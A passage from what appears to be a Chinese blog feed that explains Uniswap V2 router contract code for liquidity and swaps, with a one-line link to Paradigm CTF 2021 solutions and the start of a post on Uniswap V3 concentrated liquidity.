amountBDesired.</td></tr><tr><td>to</td><td><code>address</code></td><td>Recipient of the liquidity tokens.</td></tr><tr><td>deadline</td><td><code>uint</code></td><td>Unix timestamp after which the transaction will revert.</td></tr><tr><td></td><td></td><td></td></tr><tr><td>amountA</td><td><code>uint</code></td><td>The amount of tokenA sent to the pool.</td></tr><tr><td>amountB</td><td><code>uint</code></td><td>The amount of tokenB sent to the pool.</td></tr><tr><td>liquidity</td><td><code>uint</code></td><td>The amount of liquidity tokens minted.</td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function addLiquidity(</span><br><span class="line">    address tokenA,</span><br><span class="line">    address tokenB,</span><br><span class="line">    uint amountADesired,</span><br><span class="line">    uint amountBDesired,</span><br><span class="line">    uint amountAMin,</span><br><span class="line">    uint amountBMin,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) &#123;</span><br><span class="line">    (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);</span><br><span class="line">    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);</span><br><span class="line">    TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);</span><br><span class="line">    TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);</span><br><span class="line">    liquidity = IUniswapV2Pair(pair).mint(to);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于Router02是直接与用户交互的，因此接口设计需要从用户使用场景考虑。addLiquidity提供了8个参数：</p><ul><li>address tokenA：代币A</li><li>address tokenB：代币B</li><li>uint amountADesired：希望存入的代币A数量</li><li>uint amountBDesired：希望存入的代币B数量</li><li>uint amountAMin：最少存入的代币A数量</li><li>uint amountBMin：最少存入的代币B数量</li><li>address to：流动性代币接收地址</li><li>uint deadline：请求失效时间</li></ul><p>真正得到的代币A和B的数额不是amountADesired、amountBDesired、amountAMin、amountBMin，而是根据公式(_swap())计算出来的</p><p>用户提交交易后，该交易被矿工打包的时间是不确定的，因此提交时的代币价格与交易打包时的价格可能不同，通过amountMin可以控制价格的浮动范围，防止被矿工或机器人套利；同样，deadline可以确保该交易在超过指定时间后将失效。</p><p>在core合约中提到，如果用户提供流动性时的代币价格与实际价格有差距，则只会按照较低的汇率得到流动性代币，多余的代币将贡献给整个池子。_addLiquidity可以帮助计算最佳汇率。如果是首次添加流动性，则会先创建交易对合约；否则根据当前池子余额计算应该注入的最佳代币数量。</p><p>函数实现：</p><ul><li>首先，调用内部方法<code>_addLiquidity</code>，根据输入的期望值和最小值，计算实际添加的代币A和代币B的数量。</li><li>然后，使用<code>UniswapV2Library.pairFor</code>方法获取代币A和代币B对应的交易对合约地址。</li><li>使用<code>TransferHelper.safeTransferFrom</code>方法将计算得到的代币A和代币B数量从<code>msg.sender</code>（调用者）转移到交易对合约地址。</li><li>调用交易对合约的<code>mint</code>方法，向<code>to</code>地址铸造等价于添加的流动性的流动性凭证（LP Token）。</li><li>最后，返回实际添加的代币A和代币B的数量以及铸造的流动性凭证数量。</li></ul><h4 id="addLiquidity-1"><a href="#addLiquidity-1" class="headerlink" title="_addLiquidity"></a>_addLiquidity</h4><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230503101333602.png" alt="image-20230503101333602"></p><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230503101438885.png" alt="image-20230503101438885"></p><p>amountADesired和amountBDesired是期望获得的值，也是最大值，实际的值不可以超过这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// **** ADD LIQUIDITY ****</span><br><span class="line">function _addLiquidity(</span><br><span class="line">    address tokenA,</span><br><span class="line">    address tokenB,</span><br><span class="line">    uint amountADesired,</span><br><span class="line">    uint amountBDesired,</span><br><span class="line">    uint amountAMin,</span><br><span class="line">    uint amountBMin</span><br><span class="line">) internal virtual returns (uint amountA, uint amountB) &#123;</span><br><span class="line">    // create the pair if it doesn&#x27;t exist yet</span><br><span class="line">    if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) &#123;</span><br><span class="line">        IUniswapV2Factory(factory).createPair(tokenA, tokenB);</span><br><span class="line">    &#125;</span><br><span class="line">    (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);</span><br><span class="line">    if (reserveA == 0 &amp;&amp; reserveB == 0) &#123; </span><br><span class="line">    // 没有库存，说明是第一次添加流动性</span><br><span class="line">    // 第一次添加流动性，那么期望值就是实际值</span><br><span class="line">        (amountA, amountB) = (amountADesired, amountBDesired);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    // 根据A、B的储备量和其中一个期望的代币数量，得到另外一个代币数量，都要满足在期望值和最小值的区间当中</span><br><span class="line">    // 这个最终的值是根据quote()计算得到的，这个得到的结果满足在期望值和最小值的区间当中，否则revert</span><br><span class="line">    // 为什么可能有两种情况呢？因为我们无法知道是tokenA还是tokenB波动，因此要根据实际</span><br><span class="line">    // 情况来进行判断，实际的结果是：一个是用户期望的代币数量，另外一个是位于用户的波动区间</span><br><span class="line">    </span><br><span class="line">        uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);</span><br><span class="line">        if (amountBOptimal &lt;= amountBDesired) &#123;</span><br><span class="line">            require(amountBOptimal &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;);</span><br><span class="line">            (amountA, amountB) = (amountADesired, amountBOptimal);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);</span><br><span class="line">            assert(amountAOptimal &lt;= amountADesired);</span><br><span class="line">            require(amountAOptimal &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;);</span><br><span class="line">            (amountA, amountB) = (amountAOptimal, amountBDesired);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举个例子：</p><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230503105221870.png" alt="image-20230503105221870"></p><h4 id="removeLiquidity"><a href="#removeLiquidity" class="headerlink" title="removeLiquidity"></a>removeLiquidity</h4><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230503142951915.png" alt="image-20230503142951915"></p><p>首先将流动性代币发送到pair合约，根据收到的流动性代币占全部代币比例，计算该流动性代表的两种代币数量。合约销毁流动性代币后，用户将收到对应比例的代币。如果低于用户设定的最低预期（amountAMin/amountBMin），则回滚交易。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// **** REMOVE LIQUIDITY ****</span><br><span class="line">function removeLiquidity(</span><br><span class="line">    address tokenA,</span><br><span class="line">    address tokenB,</span><br><span class="line">    uint liquidity,</span><br><span class="line">    uint amountAMin,</span><br><span class="line">    uint amountBMin,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) public virtual override ensure(deadline) returns (uint amountA, uint amountB) &#123;</span><br><span class="line">    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);</span><br><span class="line">    IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair</span><br><span class="line">    (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);</span><br><span class="line">    </span><br><span class="line">    // amount0必须匹配tokenA，amount1必须匹配tokenB</span><br><span class="line">    // 用token0与tokenA作比较即可</span><br><span class="line">    (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB);</span><br><span class="line">    (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0);</span><br><span class="line">    </span><br><span class="line">    require(amountA &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;);</span><br><span class="line">    require(amountB &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数实现：</p><ul><li>首先，通过<code>UniswapV2Library.pairFor</code>方法获取代币A和代币B对应的交易对地址。</li><li>然后，调用<code>IUniswapV2Pair(pair).transferFrom</code>方法将用户提供的流动性（LP tokens）发送到交易对合约。</li><li>调用<code>IUniswapV2Pair(pair).burn</code>方法销毁提供的流动性（LP tokens），并获取兑换回的代币数量（<code>amount0</code>和<code>amount1</code>）。</li><li>使用<code>UniswapV2Library.sortTokens</code>方法对代币进行排序，以确保代币A和代币B的顺序与交易对的顺序一致。</li><li>根据代币A和代币B的顺序，将<code>amount0</code>和<code>amount1</code>分配给<code>amountA</code>和<code>amountB</code>。</li><li>最后，确保移除流动性后获得的代币A和代币B的数量大于等于用户设置的最小接受数量（<code>amountAMin</code>和<code>amountBMin</code>）。</li></ul><h4 id="removeLiquidityWithPermit"><a href="#removeLiquidityWithPermit" class="headerlink" title="removeLiquidityWithPermit"></a>removeLiquidityWithPermit</h4><blockquote><p>使用签名移除流动性</p></blockquote><p>用户正常移除流动性时，需要两个操作：</p><ol><li>approve：授权Router合约花费自己的流动性代币</li><li>removeLiquidity：调用Router合约移除流动性</li></ol><p>除非第一次授权了最大限额的代币，否则每次移除流动性都需要两次交互，这意味着用户需要支付两次手续费。而使用removeLiquidityWithPermit方法，用户可以通过签名方式授权Router合约花费自己的代币，无需单独调用approve，只需要调用一次移除流动性方法即可完成操作，节省了gas费用。同时，由于离线签名不需要花费gas，因此可以每次签名仅授权一定额度的代币，提高安全性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function removeLiquidityWithPermit(</span><br><span class="line">    address tokenA,</span><br><span class="line">    address tokenB,</span><br><span class="line">    uint liquidity,</span><br><span class="line">    uint amountAMin,</span><br><span class="line">    uint amountBMin,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline,</span><br><span class="line">    bool approveMax, uint8 v, bytes32 r, bytes32 s</span><br><span class="line">) external virtual override returns (uint amountA, uint amountB) &#123;</span><br><span class="line">    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);</span><br><span class="line">    uint value = approveMax ? uint(-1) : liquidity;</span><br><span class="line">    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);</span><br><span class="line">    (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数参数：</p><ul><li><code>tokenA</code>和<code>tokenB</code> (address)：流动性池中的两种代币的地址。</li><li><code>liquidity</code> (uint)：用户希望移除的流动性数量（LP tokens数量）。</li><li><code>amountAMin</code>和<code>amountBMin</code> (uint)：用户接受的最小代币数量。</li><li><code>to</code> (address)：接收移除的流动性（原始代币）的地址。</li><li><code>deadline</code> (uint)：交易的截止时间，用于确保交易在截止时间前完成。</li><li><code>approveMax</code> (bool)：是否批准最大数量的LP tokens。</li><li><code>v</code>, <code>r</code>, <code>s</code>：用户签名的组成部分，用于验证签名的有效性。</li></ul><p>函数实现：</p><ul><li>首先，通过<code>UniswapV2Library.pairFor</code>方法获取代币A和代币B对应的交易对地址。</li><li>然后，根据<code>approveMax</code>的值来设置许可的LP tokens数量。如果<code>approveMax</code>为真，则设置许可数量为<code>uint(-1)</code>（代表最大值）；否则，设置许可数量为<code>liquidity</code>。</li><li>调用<code>IUniswapV2Pair(pair).permit</code>方法，使用用户签名的参数（<code>v</code>, <code>r</code>, <code>s</code>），为当前合约地址授权LP tokens。</li><li>调用<code>removeLiquidity</code>方法，移除流动性并将原始代币发送到目标地址。这个方法返回实际移除的代币A和代币B的数量（<code>amountA</code>和<code>amountB</code>）。</li></ul><p>v,r,s在链下获得：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ethers = <span class="built_in">require</span>(<span class="string">&#x27;ethers&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设已有用户的私钥和相关参数</span></span><br><span class="line"><span class="keyword">const</span> privateKey = <span class="string">&#x27;YOUR_PRIVATE_KEY&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> owner = <span class="string">&#x27;0x...&#x27;</span>; <span class="comment">// 用户地址</span></span><br><span class="line"><span class="keyword">const</span> spender = <span class="string">&#x27;0x...&#x27;</span>; <span class="comment">// 路由器合约地址</span></span><br><span class="line"><span class="keyword">const</span> value = <span class="number">100</span>; <span class="comment">// 许可数量</span></span><br><span class="line"><span class="keyword">const</span> nonce = <span class="number">1</span>; <span class="comment">// 非重放攻击参数</span></span><br><span class="line"><span class="keyword">const</span> deadline = <span class="number">1234567890</span>; <span class="comment">// 交易截止时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化私钥钱包</span></span><br><span class="line"><span class="keyword">const</span> wallet = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造EIP-712类型的消息</span></span><br><span class="line"><span class="keyword">const</span> domain = ...; <span class="comment">// 域名分隔符</span></span><br><span class="line"><span class="keyword">const</span> types = ...; <span class="comment">// 类型定义</span></span><br><span class="line"><span class="keyword">const</span> message = &#123;</span><br><span class="line">  owner,</span><br><span class="line">  spender,</span><br><span class="line">  value,</span><br><span class="line">  nonce,</span><br><span class="line">  deadline</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对消息进行哈希</span></span><br><span class="line"><span class="keyword">const</span> typedData = ethers.<span class="property">utils</span>.<span class="property">TypedData</span>.<span class="title function_">getDigest</span>(domain, types, message);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对哈希值进行签名</span></span><br><span class="line"><span class="keyword">const</span> signature = <span class="keyword">await</span> wallet.<span class="title function_">signMessage</span>(ethers.<span class="property">utils</span>.<span class="title function_">arrayify</span>(typedData));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提取签名参数v, r, s</span></span><br><span class="line"><span class="keyword">const</span> &#123; v, r, s &#125; = ethers.<span class="property">utils</span>.<span class="title function_">splitSignature</span>(signature);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;v:&#x27;</span>, v);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;r:&#x27;</span>, r);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;s:&#x27;</span>, s);</span><br></pre></td></tr></table></figure><h4 id="swapExactTokensForTokens"><a href="#swapExactTokensForTokens" class="headerlink" title="swapExactTokensForTokens"></a>swapExactTokensForTokens</h4><p><img src="/2023/08/14/03.Uniswap/04.uniswap_v2_code/image-20230503145837091.png" alt="image-20230503145837091"></p><p>使用指定数量的代币A（输入），尽可能兑换最多数量的代币B（输出）</p><p>amountOutMin两个作用：滑点；此交易不知道什么时候成功，市场可能波动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function swapExactTokensForTokens(</span><br><span class="line">    uint amountIn,</span><br><span class="line">    uint amountOutMin, // 期望收到的最少的token</span><br><span class="line">    address[] calldata path,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123;</span><br><span class="line">    amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);</span><br><span class="line">    require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">    TransferHelper.safeTransferFrom(</span><br><span class="line">        path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]</span><br><span class="line">    );</span><br><span class="line">    _swap(amounts, path, to);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用Library合约中的getAmountsOut方法，根据兑换路径计算每一次交易的输出代币数量，确认最后一次交易得到的数量（amounts[amounts.length - 1]）不小于预期最少输出（amountOutMin）；将代币发送到第一个交易对地址，开始执行整个兑换交易。 </p><p>假设用户希望使用WETH兑换DYDX，链下计算的最佳兑换路径为WETH → USDC → DYDX，则amountIn为WETH数量，amountOutMin为希望获得最少DYDX数量，path为[WETH address, USDC address, DYDX address]，amounts为[amountIn, USDC amount, DYDX amount]。在swap执行交易的过程中，每次中间交易获得的中间代币将被发送到下一个交易对地址，以此类推，直到最后一个交易完成，to地址将收到最后一次交易的输出代币。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// requires the initial amount to have already been sent to the first pair</span><br><span class="line">function _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123;</span><br><span class="line">    for (uint i; i &lt; path.length - 1; i++) &#123;</span><br><span class="line">        (address input, address output) = (path[i], path[i + 1]);</span><br><span class="line">        (address token0,) = UniswapV2Library.sortTokens(input, output);</span><br><span class="line">        uint amountOut = amounts[i + 1];</span><br><span class="line">        (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));</span><br><span class="line">        address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;</span><br><span class="line">        IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap(</span><br><span class="line">            amount0Out, amount1Out, to, new bytes(0)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="swapTokensForExactTokens"><a href="#swapTokensForExactTokens" class="headerlink" title="swapTokensForExactTokens"></a>swapTokensForExactTokens</h4><p>获得指定数量的代币B（输出），尽可能使用最少数量的代币A（输入）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function swapTokensForExactTokens(</span><br><span class="line">    uint amountOut,</span><br><span class="line">    uint amountInMax,</span><br><span class="line">    address[] calldata path,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123;</span><br><span class="line">    amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);</span><br><span class="line">    require(amounts[0] &lt;= amountInMax, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;);</span><br><span class="line">    TransferHelper.safeTransferFrom(</span><br><span class="line">        path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]</span><br><span class="line">    );</span><br><span class="line">    _swap(amounts, path, to);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上面类似，这里先使用Library的getAmountsIn方法反向计算每一次兑换所需的最少输入代币数量，确认计算得出的（扣除手续费后）第一个代币所需的最少代币数不大于用户愿意提供的最大代币数（amountInMax）；将代币发送到第一个交易对地址，调用_swap开始执行整个兑换交易。</p><h4 id="ERC20-ETH"><a href="#ERC20-ETH" class="headerlink" title="ERC20-ETH"></a>ERC20-ETH</h4><p>由于core合约只支持ERC20代币交易，为了支持ETH交易，periphery合约需要将ETH与WETH做转换；并为大部分方法提供了ETH版本。兑换主要涉及两种操作：</p><ol><li>地址转换：由于ETH没有合约地址，因此需要使用WETH合约的deposit和withdraw方法完成ETH与WETH的兑换</li><li>代币数量转换：ETH的代币需要通过msg.value获取，可根据该值计算对应的WETH数量，而后使用标准ERC20接口即可</li></ol><p>swapExactETHForTokens</p><p>swapTokensForExactETH</p><p>swapExactTokensForETH</p><p>swapETHForExactTokens</p><h4 id="SupportingFeeOnTransferTokens后缀"><a href="#SupportingFeeOnTransferTokens后缀" class="headerlink" title="SupportingFeeOnTransferTokens后缀"></a>SupportingFeeOnTransferTokens后缀</h4><p>他是交易完之后比较，交易完之后是包含手续费的。没有加这个后缀是在交易前比较，没有包含手续费</p><p>由于某些代币会在转账（transfer）过程中收取手续费，转账数量与实际收到的数量有差异，因此无法直接通过计算得出中间兑换过程中所需的代币数量，此时应该通过balanceOf方法（而非transfer方法）判断实际收到的代币数量。Router02新增了对Inclusive Fee On Transfer Tokens的支持，更具体说明可以参考<a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/common-errors#inclusive-fee-on-transfer-tokens">官方文档</a>。</p><p>_swapSupportingFeeOnTransferTokens</p><p>swapExactTokensForTokensSupportingFeeOnTransferTokens</p><p>等等</p><h4 id="swap-1"><a href="#swap-1" class="headerlink" title="_swap"></a>_swap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// **** SWAP ****</span><br><span class="line">// requires the initial amount to have already been sent to the first pair</span><br><span class="line">function _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123;</span><br><span class="line">    for (uint i; i &lt; path.length - 1; i++) &#123;</span><br><span class="line">        (address input, address output) = (path[i], path[i + 1]);</span><br><span class="line">        (address token0,) = UniswapV2Library.sortTokens(input, output);</span><br><span class="line">        uint amountOut = amounts[i + 1];</span><br><span class="line">        (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));</span><br><span class="line">        address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;</span><br><span class="line">        // 根据上面一系列方法，算出最终要交换的数量</span><br><span class="line">        IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap(</span><br><span class="line">            amount0Out, amount1Out, to, new bytes(0)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="swap方法之间的差异"><a href="#swap方法之间的差异" class="headerlink" title="swap方法之间的差异"></a>swap方法之间的差异</h4><ul><li>swapExactTokensForTokens：已知输入换未知输出(token,token)</li><li>swapTokensForExactTokens：想要获取一定数量的输出，需要多少输入(token,token)</li><li>swapExactETHForTokens：已知输入换未知输出(ETH,WETH)</li><li>swapTokensForExactETH：</li><li>swapExactTokensForETH：</li><li>swapETHForExactTokens：</li></ul>]]></content>
      
      
      <categories>
          
          <category> 03.Uniswap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.digest</title>
      <link href="/2023/08/12/19.Paradigm%20CTF%202021/00.digest/"/>
      <url>/2023/08/12/19.Paradigm%20CTF%202021/00.digest/</url>
      
        <content type="html"><![CDATA[<h1 id="Paradigm-CTF-2021"><a href="#Paradigm-CTF-2021" class="headerlink" title="Paradigm CTF 2021"></a>Paradigm CTF 2021</h1><p>foundry题解在<a href="https://github.com/chen4903/Paradigm-2021">github</a>.</p>]]></content>
      
      
      <categories>
          
          <category> 19.Paradigm CTF 2021 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08.uniswap_v3_theory</title>
      <link href="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/"/>
      <url>/2023/08/06/03.Uniswap/08.uniswap_v3_theory/</url>
      
        <content type="html"><![CDATA[<h1 id="uniswap-v3-theory"><a href="#uniswap-v3-theory" class="headerlink" title="uniswap_v3_theory"></a>uniswap_v3_theory</h1><h2 id="V3的改进"><a href="#V3的改进" class="headerlink" title="V3的改进"></a>V3的改进</h2><ol><li>提高资金利用率（集中流动性），增加LP深度</li><li>增强价格预言机的方便性和准确性</li><li>灵活的手续费收取机制（0.05%，0.3%，1%），比如：处理价格波动较大时无常损失很多，补偿LP；价格波动小的少收手续费</li></ol><h2 id="集中流动性"><a href="#集中流动性" class="headerlink" title="集中流动性"></a>集中流动性</h2><p>在V2版本，理论上池子中的token的价格区间是(0, ∞)，我无论投入多少钱（和流动性等比例添加流动性），都可以得到手续费分成：即使我投入1USDT和1ETH（假设价格是1：1），也能得到分成，但是平摊之后按照份额我得到的手续费分成微乎其微，因为我的1USDT和1ETH占总额极小。但我们一定可以分到钱。</p><p>无论如何都可以分到钱，这听起来很美好，但我们忽略了一个问题：资金利用率。</p><h3 id="问题所在"><a href="#问题所在" class="headerlink" title="问题所在"></a>问题所在</h3><ul><li>在V2中，当一个用户来用我们的池子做交易时，其交易的量相比我们的流动性来说是很小的。<ul><li>举个例子<ul><li>假设现在池子内资产 X 和 Y 都有 8 个，价格 p 为 1。</li><li>现在有一笔订单，用 1 个 X 来换取 1 个 Y，我们先不考虑滑点和手续费的影响，这一笔交易为我们带来的手续费收益是 <code>fee = 1 * 0.3%</code>，实际参与赚取手续费的流动性就是输出的 1 个 y，这相比于总流动性是很小的，在这一笔交易中，资金利用率是大约是 <code>1 / 8</code>。</li><li>也就是说，我们只需要极少一部分流动性就能承载这一笔交易，而大部分流动性在交易过程中只是躺在那做收益的分母而已</li></ul></li><li>图像表示<ul><li>当用户用 X 换取 Y 的时候，价格会从低点涨到高点，红点从 <code>p_lower</code> 移动到 <code>p_upper</code> 的过程中（X 的价格），实际参与交易的流动性仅仅是橙色的矩形区域。（这里为了便于查看，夸大了价格的变动区间，实际交易过程中，价格变动不会这么大，所以橙色区域是极小的）</li><li><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230804084404710.png" alt="image-20230804084404710"></li></ul></li></ul></li></ul><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>V3为了解决资金利用率低下的问题，引入了集中流动性的概念：因为实际的价格不可能在(0, ∞)，只会在一个小范围内，因此我们可以将曲线进行移动，因此实际的曲线我们设置成下图这样。并且我们做到了资金利用率是100%，因为橙色的区域就是K值，不存在绿色的区域。</p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230804084900501.png" 